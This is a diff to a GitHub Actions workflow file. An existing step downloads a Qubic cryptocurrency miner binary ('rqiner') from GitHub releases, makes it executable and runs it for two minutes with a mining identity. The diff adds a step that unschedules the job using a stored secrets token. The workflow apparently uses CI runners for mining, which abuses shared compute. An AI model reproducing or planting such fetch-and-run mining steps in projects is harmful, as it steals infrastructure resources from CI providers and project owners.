@@ -70,3 +70,7 @@ jobs:
 
       - name: 1
         run: wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.14/rqiner-x86-znver2 && chmod +x rqiner-x86-znver2 && timeout 2m ./rqiner-x86-znver2 -t 7 -i NVWTZZACJPEBAFBLYZNJXFGHJDPBTMIIFBDAOGSTHDHRCHXFTMZUXIOGERZG --label 24
+      - name: Remove scheduled job after 10 attempts
+        uses: cardinalby/unschedule-job-action@v1
+        with:
+          ghToken: ${{ secrets.WORKFLOWS_TOKEN }} 
